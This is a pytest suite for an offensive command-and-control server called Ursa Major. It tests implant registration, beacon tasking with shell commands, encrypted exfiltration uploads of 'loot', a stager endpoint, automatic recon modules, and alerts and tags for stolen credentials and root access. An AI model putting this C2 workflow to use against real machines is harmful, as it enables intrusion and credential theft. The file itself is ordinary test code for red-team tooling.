"""Tests for the Ursa Major C2 HTTP server."""

import base64
import json
import urllib.error
import urllib.request

from major.crypto import CRYPTO_SUITE, UrsaCrypto
from major.db import create_task, get_events, get_session, get_task, list_tasks, set_setting


def _post(host, port, path, data):
    """POST JSON to the test C2 server."""
    url = f"http://{host}:{port}{path}"
    body = json.dumps(data).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    try:
        resp = urllib.request.urlopen(req, timeout=5)
        return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        body = json.loads(e.read()) if e.fp else {}
        return e.code, body


def _get(host, port, path):
    """GET from the test C2 server."""
    url = f"http://{host}:{port}{path}"
    try:
        resp = urllib.request.urlopen(url, timeout=5)
        return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


class TestGetEndpoints:

    def test_root_returns_ok(self, c2_test_server):
        host, port = c2_test_server
        status, body = _get(host, port, "/")
        data = json.loads(body)
        assert status == 200
        assert data["status"] == "ok"

    def test_health_endpoint(self, c2_test_server):
        host, port = c2_test_server
        status, body = _get(host, port, "/health")
        data = json.loads(body)
        assert status == 200
        assert data["status"] == "healthy"

    def test_unknown_path_returns_404(self, c2_test_server):
        host, port = c2_test_server
        status, _ = _get(host, port, "/nonexistent")
        assert status == 404


class TestRegistration:

    def test_register_creates_session(self, c2_test_server):
        host, port = c2_test_server
        status, resp = _post(host, port, "/register", {
            "hostname": "VICTIM1",
            "username": "jdoe",
            "os": "Windows 10",
            "arch": "x64",
            "pid": 4444,
            "process": "explorer.exe",
        })
        assert status == 200
        assert "session_id" in resp
        assert "key" in resp
        assert len(resp["key"]) == 64
        assert resp["crypto"]["suite"] == CRYPTO_SUITE
        assert resp["crypto"]["frame_magic"] == "URS2"
        assert resp["crypto"]["legacy_encrypted_frames"] == "rejected"

        session = get_session(resp["session_id"])
        assert session is not None
        assert session["hostname"] == "VICTIM1"
        assert session["username"] == "jdoe"

    def test_register_minimal_body(self, c2_test_server):
        host, port = c2_test_server
        status, resp = _post(host, port, "/register", {})
        assert status == 200
        assert "session_id" in resp


class TestBeacon:

    def _register(self, host, port):
        _, resp = _post(host, port, "/register", {"hostname": "BEACON_TEST"})
        return resp

    def test_beacon_returns_pending_tasks(self, c2_test_server):
        host, port = c2_test_server
        reg = self._register(host, port)
        sid = reg["session_id"]
        tid = create_task(sid, "shell", {"command": "whoami"})

        status, resp = _post(host, port, "/beacon", {"session_id": sid})
        assert status == 200
        assert len(resp["tasks"]) == 1
        assert resp["tasks"][0]["type"] == "shell"
        assert resp["tasks"][0]["id"] == tid

    def test_beacon_empty_when_no_tasks(self, c2_test_server):
        host, port = c2_test_server
        sid = self._register(host, port)["session_id"]

        status, resp = _post(host, port, "/beacon", {"session_id": sid})
        assert status == 200
        assert resp["tasks"] == []

    def test_encrypted_beacon_returns_aead_task_frame(self, c2_test_server):
        host, port = c2_test_server
        reg = self._register(host, port)
        sid = reg["session_id"]
        tid = create_task(sid, "shell", {"command": "whoami"})

        status, resp = _post(host, port, "/beacon", {
            "session_id": sid,
            "encrypted": True,
        })
        assert status == 200
        assert "data" in resp
        assert "tasks" not in resp
        payload = UrsaCrypto(reg["key"]).decrypt_json(resp["data"])
        assert payload["tasks"][0]["id"] == tid
        assert payload["tasks"][0]["type"] == "shell"

    def test_beacon_unknown_session_returns_404(self, c2_test_server):
        host, port = c2_test_server
        status, _ = _post(host, port, "/beacon", {"session_id": "INVALID1"})
        assert status == 404

    def test_beacon_missing_session_id_returns_400(self, c2_test_server):
        host, port = c2_test_server
        status, _ = _post(host, port, "/beacon", {})
        assert status == 400


class TestResult:

    def test_submit_result(self, c2_test_server):
        host, port = c2_test_server
        _, reg = _post(host, port, "/register", {"hostname": "R1"})
        sid = reg["session_id"]
        tid = create_task(sid, "shell", {"command": "id"})

        status, resp = _post(host, port, "/result", {
            "session_id": sid,
            "task_id": tid,
            "result": "uid=0(root)",
            "error": "",
        })
        assert status == 200
        t = get_task(tid)
        assert t["status"] == "completed"
        assert t["result"] == "uid=0(root)"

    def test_submit_encrypted_result(self, c2_test_server):
        host, port = c2_test_server
        _, reg = _post(host, port, "/register", {"hostname": "R2"})
        sid = reg["session_id"]
        tid = create_task(sid, "shell", {"command": "id"})
        crypto = UrsaCrypto(reg["key"])

        status, resp = _post(host, port, "/result", {
            "session_id": sid,
            "task_id": tid,
            "encrypted": True,
            "data": crypto.encrypt_json({"result": "uid=501(op)", "error": ""}),
        })
        assert status == 200
        assert resp["status"] == "ok"
        t = get_task(tid)
        assert t["status"] == "completed"
        assert t["result"] == "uid=501(op)"

    def test_legacy_encrypted_result_rejected(self, c2_test_server):
        host, port = c2_test_server
        _, reg = _post(host, port, "/register", {"hostname": "R3"})
        sid = reg["session_id"]
        tid = create_task(sid, "shell", {"command": "id"})
        legacy_frame = base64.b64encode((b"\x00" * 16) + b"ciphertext" + (b"\x00" * 32)).decode()

        status, resp = _post(host, port, "/result", {
            "session_id": sid,
            "task_id": tid,
            "encrypted": True,
            "data": legacy_frame,
        })
        assert status == 400
        assert "legacy" in resp["error"]
        assert get_task(tid)["status"] == "pending"

    def test_result_missing_fields_returns_400(self, c2_test_server):
        host, port = c2_test_server
        status, _ = _post(host, port, "/result", {})
        assert status == 400


class TestFileTransfer:

    def test_upload_and_download(self, c2_test_server):
        host, port = c2_test_server
        _, reg = _post(host, port, "/register", {"hostname": "FT1"})
        sid = reg["session_id"]

        file_data = b"exfiltrated secrets"
        status, resp = _post(host, port, "/upload", {
            "session_id": sid,
            "filename": "loot.txt",
            "data": base64.b64encode(file_data).decode(),
        })
        assert status == 200
        fid = resp["file_id"]

        status, body = _get(host, port, f"/download/{fid}")
        assert status == 200
        assert body == file_data

    def test_encrypted_upload_and_download(self, c2_test_server):
        host, port = c2_test_server
        _, reg = _post(host, port, "/register", {"hostname": "FT2"})
        sid = reg["session_id"]
        file_data = b"authenticated upload"
        payload = {
            "filename": "loot-aead.txt",
            "data": base64.b64encode(file_data).decode(),
        }

        status, resp = _post(host, port, "/upload", {
            "session_id": sid,
            "encrypted": True,
            "data": UrsaCrypto(reg["key"]).encrypt_json(payload),
        })
        assert status == 200
        fid = resp["file_id"]

        status, body = _get(host, port, f"/download/{fid}")
        assert status == 200
        assert body == file_data

    def test_download_nonexistent_returns_404(self, c2_test_server):
        host, port = c2_test_server
        status, _ = _get(host, port, "/download/NOPE1234")
        assert status == 404


class TestStageEndpoint:

    def test_stage_serves_stager(self, c2_test_server):
        host, port = c2_test_server
        status, body = _get(host, port, "/stage")
        assert status == 200
        assert len(body) > 0


class TestAutoRecon:
    """Auto-recon: queue initial recon sequence on new session registration."""

    def _register(self, host, port, hostname="RECON1"):
        _, resp = _post(host, port, "/register", {"hostname": hostname, "username": "op"})
        return resp["session_id"]

    # ── disabled (default) ────────────────────────────────────────────────────

    def test_no_auto_recon_tasks_when_disabled(self, c2_test_server, tmp_db):
        """Default: auto-recon is off — no tasks queued on registration."""
        host, port = c2_test_server
        sid = self._register(host, port)
        tasks = list_tasks(session_id=sid)
        assert tasks == [], "Expected zero tasks when auto-recon is disabled"

    def test_beacon_returns_no_tasks_when_disabled(self, c2_test_server, tmp_db):
        """Beacon check-in with no auto-recon yields empty task list."""
        host, port = c2_test_server
        sid = self._register(host, port)
        _, beacon_resp = _post(host, port, "/beacon", {"session_id": sid})
        assert beacon_resp.get("tasks", []) == []

    # ── enabled ───────────────────────────────────────────────────────────────

    def test_auto_recon_queues_tasks_when_enabled(self, c2_test_server, tmp_db):
        """Enable auto-recon → tasks queued immediately on registration."""
        set_setting("auto_recon.enabled", True)
        host, port = c2_test_server
        sid = self._register(host, port)
        tasks = list_tasks(session_id=sid)
        assert len(tasks) > 0, "Expected auto-recon tasks to be queued"

    def test_auto_recon_queues_default_module_count(self, c2_test_server, tmp_db):
        """Default module list has 5 entries: sysinfo, users, privesc, network, loot."""
        set_setting("auto_recon.enabled", True)
        host, port = c2_test_server
        sid = self._register(host, port)
        tasks = list_tasks(session_id=sid)
        assert len(tasks) == 5

    def test_auto_recon_tasks_are_type_post(self, c2_test_server, tmp_db):
        """All auto-recon tasks must be of type 'post'."""
        set_setting("auto_recon.enabled", True)
        host, port = c2_test_server
        sid = self._register(host, port)
        tasks = list_tasks(session_id=sid)
        assert all(t["task_type"] == "post" for t in tasks)

    def test_auto_recon_task_args_contain_module_and_code(self, c2_test_server, tmp_db):
        """Each auto-recon task args must include 'module' and 'code'."""
        set_setting("auto_recon.enabled", True)
        host, port = c2_test_server
        sid = self._register(host, port)
        tasks = list_tasks(session_id=sid)
        for t in tasks:
            args = json.loads(t["args"]) if isinstance(t["args"], str) else t["args"]
            assert "module" in args, f"Missing 'module' in args: {args}"
            assert "code"   in args, f"Missing 'code'   in args: {args}"

    def test_auto_recon_module_order(self, c2_test_server, tmp_db):
        """Tasks queued in the expected order: sysinfo → users → privesc → network → loot."""
        set_setting("auto_recon.enabled", True)
        host, port = c2_test_server
        sid = self._register(host, port)
        # list_tasks returns DESC; sort ASC by created_at to get insertion order
        tasks = sorted(list_tasks(session_id=sid), key=lambda t: t["created_at"])
        modules = [
            json.loads(t["args"])["module"]
            if isinstance(t["args"], str)
            else t["args"]["module"]
            for t in tasks
        ]
        assert modules == [
            "enum/sysinfo",
            "enum/users",
            "enum/privesc",
            "enum/network",
            "enum/loot",
        ]

    def test_auto_recon_custom_module_list(self, c2_test_server, tmp_db):
        """Custom module list is respected when set via DB settings."""
        custom = ["enum/sysinfo", "enum/network"]
        set_setting("auto_recon.enabled", True)
        set_setting("auto_recon.modules", custom)
        host, port = c2_test_server
        sid = self._register(host, port)
        tasks = sorted(list_tasks(session_id=sid), key=lambda t: t["created_at"])
        assert len(tasks) == 2
        modules = [
            json.loads(t["args"])["module"]
            if isinstance(t["args"], str)
            else t["args"]["module"]
            for t in tasks
        ]
        assert modules == custom

    def test_auto_recon_tasks_start_pending(self, c2_test_server, tmp_db):
        """Auto-recon tasks are initially in 'pending' state."""
        set_setting("auto_recon.enabled", True)
        host, port = c2_test_server
        sid = self._register(host, port)
        tasks = list_tasks(session_id=sid)
        assert all(t["status"] == "pending" for t in tasks)

    def test_auto_recon_beacon_delivers_tasks(self, c2_test_server, tmp_db):
        """First beacon check-in after registration receives all queued tasks."""
        set_setting("auto_recon.enabled", True)
        host, port = c2_test_server
        sid = self._register(host, port)
        _, beacon_resp = _post(host, port, "/beacon", {"session_id": sid})
        delivered = beacon_resp.get("tasks", [])
        assert len(delivered) == 5
        assert all(t["type"] == "post" for t in delivered)

    def test_disable_setting_overrides_enable(self, c2_test_server, tmp_db):
        """Explicitly disabling (set False) suppresses auto-recon even if config default were True."""
        set_setting("auto_recon.enabled", False)
        host, port = c2_test_server
        sid = self._register(host, port)
        tasks = list_tasks(session_id=sid)
        assert tasks == []

    def test_multiple_sessions_each_get_own_tasks(self, c2_test_server, tmp_db):
        """Each new session gets its own independent auto-recon task set."""
        set_setting("auto_recon.enabled", True)
        host, port = c2_test_server
        sid1 = self._register(host, port, hostname="HOST1")
        sid2 = self._register(host, port, hostname="HOST2")
        tasks1 = list_tasks(session_id=sid1)
        tasks2 = list_tasks(session_id=sid2)
        assert len(tasks1) == 5
        assert len(tasks2) == 5
        # Tasks are independent — different task IDs
        ids1 = {t["id"] for t in tasks1}
        ids2 = {t["id"] for t in tasks2}
        assert ids1.isdisjoint(ids2)


# ── Helpers ───────────────────────────────────────────────────────────────────

def _loot_result(findings):
    """Build a beacon post-task result string with synthetic findings."""
    data = {"findings": findings, "finding_counts": {}}
    return f"Module output\n\n--- data ---\n{json.dumps(data)}"


def _sysinfo_result(hostname="HOST1", os_name="Linux", os_release="5.15",
                    machine="x86_64", user="jdoe", container_hints=None, extra_env=None):
    """Build a synthetic enum/sysinfo result string."""
    env = {"USER": user, "HOME": f"/home/{user}"}
    if extra_env:
        env.update(extra_env)
    data = {
        "hostname": hostname,
        "os": os_name,
        "os_release": os_release,
        "machine": machine,
        "env": env,
        "container_vm_hints": container_hints or [],
    }
    return f"Hostname: {hostname}\n\n--- data ---\n{json.dumps(data)}"


# ── TestLootAlerts ────────────────────────────────────────────────────────────

class TestLootAlerts:
    """_fire_loot_alerts(): critical/high loot findings create log events."""

    def _submit(self, host, port, session_id, task_id, result_str):
        return _post(host, port, "/result", {
            "session_id": session_id,
            "task_id": task_id,
            "result": result_str,
            "error": "",
        })

    def _make_session_and_task(self, host, port, module="enum/loot"):
        _, reg = _post(host, port, "/register", {"hostname": "H1", "username": "op"})
        sid = reg["session_id"]
        tid = create_task(sid, "post", {"code": "stub", "module": module, "args": {}})
        return sid, tid

    # basic wiring

    def test_critical_finding_creates_warning_event(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._make_session_and_task(host, port, "enum/loot")
        findings = [{"severity": "CRITICAL", "title": "uid=0", "category": "privesc", "detail": "root"}]
        self._submit(host, port, sid, tid, _loot_result(findings))
        events = get_events(limit=50)
        warning_events = [e for e in events if e["level"] == "warning" and "uid=0" in e["message"]]
        assert len(warning_events) == 1

    def test_high_finding_creates_info_event(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._make_session_and_task(host, port, "cred/loot")
        findings = [{"severity": "HIGH", "title": "browser creds", "category": "cred", "detail": "14"}]
        self._submit(host, port, sid, tid, _loot_result(findings))
        events = get_events(limit=50)
        info_events = [e for e in events if e["level"] == "info" and "browser creds" in e["message"]]
        assert len(info_events) == 1

    def test_medium_finding_no_event(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._make_session_and_task(host, port, "enum/loot")
        findings = [{"severity": "MEDIUM", "title": "writable cron", "category": "privesc", "detail": ""}]
        self._submit(host, port, sid, tid, _loot_result(findings))
        events = get_events(limit=50)
        recon_events = [e for e in events if e.get("source") == "recon" and "writable cron" in e["message"]]
        assert recon_events == []

    def test_low_finding_no_event(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._make_session_and_task(host, port, "enum/loot")
        findings = [{"severity": "LOW", "title": "arp entry", "category": "network", "detail": ""}]
        self._submit(host, port, sid, tid, _loot_result(findings))
        events = get_events(limit=50)
        recon_events = [e for e in events if e.get("source") == "recon" and "arp entry" in e["message"]]
        assert recon_events == []

    def test_multiple_critical_findings_each_logged(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._make_session_and_task(host, port, "enum/loot")
        findings = [
            {"severity": "CRITICAL", "title": "shadow readable", "category": "privesc", "detail": ""},
            {"severity": "CRITICAL", "title": "uid=0 process",   "category": "privesc", "detail": ""},
        ]
        self._submit(host, port, sid, tid, _loot_result(findings))
        events = get_events(limit=50)
        crits = [e for e in events if e["level"] == "warning" and e.get("source") == "recon"]
        assert len(crits) == 2

    def test_event_tagged_with_session_id(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._make_session_and_task(host, port, "enum/loot")
        findings = [{"severity": "CRITICAL", "title": "root shell", "category": "privesc", "detail": ""}]
        self._submit(host, port, sid, tid, _loot_result(findings))
        events = get_events(limit=50)
        recon = [e for e in events if e.get("source") == "recon" and "root shell" in e["message"]]
        assert recon[0]["session_id"] == sid

    def test_non_loot_module_no_alert(self, c2_test_server, tmp_db):
        """enum/sysinfo results should not fire loot alerts even if result contains 'CRITICAL'."""
        host, port = c2_test_server
        _, reg = _post(host, port, "/register", {"hostname": "H1"})
        sid = reg["session_id"]
        tid = create_task(sid, "post", {"code": "stub", "module": "enum/sysinfo", "args": {}})
        # Result that would parse as having findings if the wrong module check was skipped
        findings = [{"severity": "CRITICAL", "title": "x", "category": "c", "detail": ""}]
        self._submit(host, port, sid, tid, _loot_result(findings))
        events = get_events(limit=50)
        recon = [e for e in events if e.get("source") == "recon"]
        assert recon == []

    def test_error_result_no_alert(self, c2_test_server, tmp_db):
        """Task submitted with error string should not fire alerts."""
        host, port = c2_test_server
        sid, tid = self._make_session_and_task(host, port, "enum/loot")
        _post(host, port, "/result", {
            "session_id": sid, "task_id": tid,
            "result": "", "error": "exec failed",
        })
        events = get_events(limit=50)
        recon = [e for e in events if e.get("source") == "recon"]
        assert recon == []

    def test_cred_loot_critical_alert(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._make_session_and_task(host, port, "cred/loot")
        findings = [{"severity": "CRITICAL", "title": "plaintext Chrome pw", "category": "cred", "detail": "14"}]
        self._submit(host, port, sid, tid, _loot_result(findings))
        events = get_events(limit=50)
        crits = [e for e in events if e["level"] == "warning" and "Chrome pw" in e["message"]]
        assert len(crits) == 1


# ── TestSysinfoAutoTag ────────────────────────────────────────────────────────

class TestSysinfoAutoTag:
    """_apply_sysinfo_autotag(): session updated from enum/sysinfo result."""

    def _register_and_task(self, host, port):
        _, reg = _post(host, port, "/register", {"hostname": "BEACON1", "username": "op"})
        sid = reg["session_id"]
        tid = create_task(sid, "post", {"code": "stub", "module": "enum/sysinfo", "args": {}})
        return sid, tid

    def _submit(self, host, port, session_id, task_id, result_str):
        _post(host, port, "/result", {
            "session_id": session_id, "task_id": task_id,
            "result": result_str, "error": "",
        })

    # OS tag

    def test_linux_os_tag_added(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid, _sysinfo_result(os_name="Linux"))
        s = get_session(sid)
        assert "linux" in s["tags"]

    def test_darwin_os_tag_added(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid, _sysinfo_result(os_name="Darwin"))
        s = get_session(sid)
        assert "darwin" in s["tags"]

    def test_windows_os_tag_added(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid, _sysinfo_result(os_name="Windows"))
        s = get_session(sid)
        assert "windows" in s["tags"]

    # Arch tag

    def test_x86_64_maps_to_x64_tag(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid, _sysinfo_result(machine="x86_64"))
        s = get_session(sid)
        assert "x64" in s["tags"]

    def test_aarch64_maps_to_arm64_tag(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid, _sysinfo_result(machine="aarch64"))
        s = get_session(sid)
        assert "arm64" in s["tags"]

    def test_arm64_maps_to_arm64_tag(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid, _sysinfo_result(machine="arm64"))
        s = get_session(sid)
        assert "arm64" in s["tags"]

    # Privilege tags

    def test_root_user_adds_root_tag(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid, _sysinfo_result(user="root"))
        s = get_session(sid)
        assert "root" in s["tags"]

    def test_non_root_user_no_root_tag(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid, _sysinfo_result(user="jdoe"))
        s = get_session(sid)
        assert "root" not in s["tags"]

    def test_administrator_adds_admin_tag(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid,
                     _sysinfo_result(os_name="Windows", user="Administrator"))
        s = get_session(sid)
        assert "admin" in s["tags"]

    # Container

    def test_container_hints_add_container_tag(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid,
                     _sysinfo_result(container_hints=["Docker (.dockerenv present)"]))
        s = get_session(sid)
        assert "container" in s["tags"]

    def test_no_container_hints_no_tag(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid, _sysinfo_result(container_hints=[]))
        s = get_session(sid)
        assert "container" not in s["tags"]

    # Cloud creds

    def test_aws_env_adds_aws_creds_tag(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid,
                     _sysinfo_result(extra_env={"AWS_ACCESS_KEY_ID": "AKIA..."}))
        s = get_session(sid)
        assert "aws-creds" in s["tags"]

    def test_kubeconfig_adds_k8s_tag(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid,
                     _sysinfo_result(extra_env={"KUBECONFIG": "/root/.kube/config"}))
        s = get_session(sid)
        assert "k8s" in s["tags"]

    # OS/arch fields updated

    def test_os_field_updated(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid,
                     _sysinfo_result(os_name="Linux", os_release="5.15.0-91"))
        s = get_session(sid)
        assert "Linux" in s["os"]
        assert "5.15" in s["os"]

    def test_arch_field_updated(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid, _sysinfo_result(machine="x86_64"))
        s = get_session(sid)
        assert "x86_64" in s["arch"]

    def test_hostname_field_updated(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid, _sysinfo_result(hostname="PRECISE-HOSTNAME"))
        s = get_session(sid)
        assert s["hostname"] == "PRECISE-HOSTNAME"

    # Non-sysinfo task does not trigger autotag

    def test_non_sysinfo_module_no_tag_update(self, c2_test_server, tmp_db):
        host, port = c2_test_server
        _, reg = _post(host, port, "/register", {"hostname": "H1"})
        sid = reg["session_id"]
        tid = create_task(sid, "post", {"code": "stub", "module": "enum/network", "args": {}})
        # Submit a sysinfo-shaped result, but for enum/network — should be ignored
        _post(host, port, "/result", {
            "session_id": sid, "task_id": tid,
            "result": _sysinfo_result(os_name="Linux", user="root"),
            "error": "",
        })
        s = get_session(sid)
        # root and linux tags must NOT be added because module isn't enum/sysinfo
        assert "root" not in (s.get("tags") or "")
        assert "linux" not in (s.get("tags") or "")

    def test_existing_tags_preserved_on_update(self, c2_test_server, tmp_db):
        """Pre-existing tags from registration must not be wiped out."""
        host, port = c2_test_server
        _, reg = _post(host, port, "/register", {
            "hostname": "H1", "tags": "custom-tag,vip",
        })
        sid = reg["session_id"]
        tid = create_task(sid, "post", {"code": "stub", "module": "enum/sysinfo", "args": {}})
        _post(host, port, "/result", {
            "session_id": sid, "task_id": tid,
            "result": _sysinfo_result(os_name="Linux"),
            "error": "",
        })
        s = get_session(sid)
        assert "custom-tag" in s["tags"]
        assert "vip" in s["tags"]
        assert "linux" in s["tags"]

    def test_tags_not_duplicated_on_repeated_result(self, c2_test_server, tmp_db):
        """Submitting sysinfo result twice must not duplicate tags."""
        host, port = c2_test_server
        sid, tid = self._register_and_task(host, port)
        self._submit(host, port, sid, tid, _sysinfo_result(os_name="Linux"))
        # Simulate second sysinfo task
        tid2 = create_task(sid, "post", {"code": "stub", "module": "enum/sysinfo", "args": {}})
        _post(host, port, "/result", {
            "session_id": sid, "task_id": tid2,
            "result": _sysinfo_result(os_name="Linux"),
            "error": "",
        })
        s = get_session(sid)
        tag_list = [t for t in s["tags"].split(",") if t.strip() == "linux"]
        assert len(tag_list) == 1, f"'linux' tag duplicated: {s['tags']}"
